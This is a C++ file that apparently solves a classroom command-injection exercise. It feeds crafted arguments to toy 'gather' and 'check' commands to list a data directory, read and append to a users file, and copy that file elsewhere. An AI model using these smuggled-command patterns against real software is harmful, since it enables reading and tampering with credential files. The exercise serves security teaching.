#include <string>
#include "gather.h"
#include "check.h"

namespace injectionAttacks
{
    /**
     * Calls the gather command with arguments that cause an error.
    */
    void causeErrorWithGatherCommand()
    {
        gather("chicken;", "iceBox");
    }

    /**
     * Calls the check command with arguments that cause an error.
    */
    void causeErrorWithCheckCommand() 
    {
        check("icebox");
        check("$ cd data $ ls");
        check("$cat cd ./data/users.txt &");
    }

    /**
     * Displays the contents of the data directory on the console.
     * It only needs to display immediate children, not nested or recursive.
     */
    void viewContentsOfDataDirectory() 
    {
        injectionAttacks::gather("rice && ls ./data;", "pantry");
    }

    /**
     * Displays the contents of the user file on the console.
     */
    void viewContentsOfUserFile()
    {
        injectionAttacks::check("../users");
    }

    /**
     * Inserts a new user into the user file.
     * The inserted line has the format "user123,password456".
     */
    void insertNewUser(std::string username, std::string passwordHash)
    {
        injectionAttacks::gather(username + "," + passwordHash + " >> ./data/users.txt;bruh", "iceBox");
    }

    /**
     * Exfiltrates the user file to the given directory.
     * E.g., calling it with ".." will create a file "users.txt" in the parent directory.
     */
    void exfiltrateUserFileToLocation(std::string location)
    {
        injectionAttacks::gather("chicken && cp ./data/users.txt " + location + ";", "iceBox");
    }
}
